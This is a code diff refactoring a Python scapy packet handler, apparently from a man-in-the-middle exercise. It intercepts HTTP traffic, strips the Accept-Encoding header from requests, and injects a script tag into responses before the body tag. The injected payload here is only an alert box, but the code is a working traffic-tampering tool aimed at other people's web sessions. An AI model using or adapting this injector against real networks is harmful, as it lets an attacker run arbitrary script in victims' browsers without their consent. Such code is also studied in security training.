@@ -17,15 +17,17 @@ def process_packet(packet):
 	scapy_packet = scapy.IP(packet.get_payload())
 
 	if scapy_packet.haslayer(scapy.Raw):
+		load = scapy_packet[scapy.Raw].load
+
 		if scapy_packet[scapy.TCP].dport == 80:
 			print("[+] Request")
-			modified_load_packet = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
-			new_packet = set_load(scapy_packet, modified_load_packet)
-			packet.set_payload(str(new_packet))
+			load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 		elif scapy_packet[scapy.TCP].sport == 80:
 			print("[+] Response")
-			modified_load_packet = scapy_packet[scapy.Raw].load.replace("<body>", "<script>alert('CykaBlyat!')</script><body>")
-			new_packet = set_load(scapy_packet, modified_load_packet)
+			load = load.replace("<body>", "<script>alert('CykaBlyat!')</script><body>")
+
+		if load != scapy_packet[scapy.Raw].load:
+			new_packet = set_load(scapy_packet, load)
 			packet.set_payload(str(new_packet))
 	packet.accept()
 
